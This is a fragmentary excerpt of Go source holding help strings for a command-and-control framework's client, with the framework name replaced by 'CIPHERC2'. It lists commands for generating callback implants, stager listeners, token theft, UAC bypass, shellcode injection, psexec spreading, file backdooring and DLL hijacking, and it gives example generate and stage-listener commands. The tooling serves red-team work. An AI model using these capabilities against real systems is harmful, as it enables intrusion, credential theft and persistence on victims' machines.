...
[[.Bold]]About:[[.Normal]] List CIPHERC2 sessions, and optionally interact or kill a session. Process integrity information is only available on Windows and is updated each time the getprivs command is executed.`

	backgroundHelp = `[[.Bold]]Command:[[.Normal]] background
[[.Bold]]About:[[.Normal]] Background the active CIPHERC2.`

	infoHelp = `[[.Bold]]Command:[[.Normal]] info <CIPHERC2 name/session>
[[.Bold]]About:[[.Normal]] Get information about a CIPHERC2 by name, or for the active CIPHERC2.`

	useHelp = `[[.Bold]]Command:[[.Normal]] use [CIPHERC2 name/session]
[[.Bold]]About:[[.Normal]] Switch the active CIPHERC2, a valid name must be provided (see sessions).`

	generateHelp = `[[.Bold]]Command:[[.Normal]] generate <options>
[[.Bold]]About:[[.Normal]] Generate a new CIPHERC2 binary and saves the output to the cwd or a path specified with --save.
...
The follow command is used to generate a CIPHERC2 Windows executable (PE) file, that will connect back to the server using mutual-TLS:
	generate --mtls foo.example.com 

The follow command is used to generate a CIPHERC2 Windows executable (PE) file, that will connect back to the server using Wireguard on UDP port 9090,
...
Execution limits can be used to restrict the execution of a CIPHERC2 implant to machines with specific configurations.

[[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
Due to the large number of options and C2s this can be a lot of typing. If you'd like to have a reusable a CIPHERC2 config
...
[[.Bold]]About:[[.Normal]] Starts a stager listener bound to a CIPHERC2 profile.
[[.Bold]]Examples:[[.Normal]] 

The following command will start a TCP listener on 1.2.3.4:8080, and link the [[.Bold]]my-CIPHERC2-profile[[.Normal]] profile to it.
When a stager calls back to this URL, a CIPHERC2 corresponding to the said profile will be sent.

stage-listener --url tcp://1.2.3.4:8080 --profile my-CIPHERC2-profile
...
[[.Bold]]About:[[.Normal]] (Windows Only) Steal the token of a logged in user. CIPHERC2 commands that run new processes (like [[.Bold]]shell[[.Normal]] or [[.Bold]]execute-command[[.Normal]]) will impersonate this user.`
...
[[.Bold]]About:[[.Normal]] (Windows Only) Spawn a new CIPHERC2 session as an elevated process (UAC bypass)`
...
Shellcode files should be binary encoded, you can generate CIPHERC2 shellcode files with the generate command:
...
Websites can be thought of as a collection of content identified by a name, CIPHERC2 can store any number of
...
[[.Bold]]Remarks:[[.Normal]]
Linux and MacOS shared library must call exit() once done with their jobs, as the CIPHERC2 implant will wait until the hosting process
...
[[.Bold]]About:[[.Normal]] Load a CIPHERC2 macro to add new commands.
...
CIPHERC2 macros have the following structure (example for the [[.Bold]]chrome-dump[[.Normal]] macro):
chrome-dump
├── chrome-dump.dll
├── chrome-dump.so
└── manifest.json
It is a directory containing any number of files, with a mandatory [[.Bold]]manifest.json[[.Normal]], that has the following structure:
{
  ...
  "macroCommands":[
    {
      "name":"chrome-dump", // name of the command available in the CIPHERC2 client (no space)
...
[[.Bold]]About:[[.Normal]] Start a new CIPHERC2 as a service on a remote target.

This command uploads a CIPHERC2 binary generated on the fly from a profile.
...
The [[.Bold]]psexec[[.Normal]] command will use the credentials of the Windows user associated with the current CIPHERC2 session.
`
	backdoorHelp = `[[.Bold]]Command:[[.Normal]] backdoor <remote file path>
[[.Bold]]About:[[.Normal]] Inject a CIPHERC2 shellcode into an existing file on the target system.
...
CIPHERC2 will attempt to detect the type of file automatically or you can specify a file type with 
...
using CIPHERC2Py (Python) or CIPHERC2-script (TypeScript/JavaScript).
...
we recommend using CIPHERC2Py (Python) or CIPHERC2-script (TypeScript/JavaScript).
...
The DLL used for the hijack can either be a file on the operator's system or built from a CIPHERC2 profile,
...
# Use a CIPHERC2 generated DLL for the hijack (you must specify -R or --run-at-load)
...
If no extension is specified, CIPHERC2 will enumerate all installed extensions, extract their
...
External builders allow the CIPHERC2 server offload implant builds onto external machines.
For more information: https://github.com/BishopFox/CIPHERC2/wiki/External-Builders
`
...
CIPHERC2 uses the same hash identifiers as Hashcat (use the #):
...
[[.Bold]]About:[[.Normal]] Display details of HTTP C2 profiles loaded into CIPHERC2.
`
